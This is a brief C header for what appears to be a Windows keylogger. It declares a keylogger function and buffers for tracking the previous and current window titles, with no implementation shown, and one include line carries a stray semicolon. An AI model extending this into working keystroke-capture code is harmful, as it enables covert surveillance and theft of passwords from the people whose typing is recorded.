#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <time.h>;
#include <Windows.h> // Windows API
char prevWindow[256];
char currWindow[256];
void keylogger(int, char*);

#endif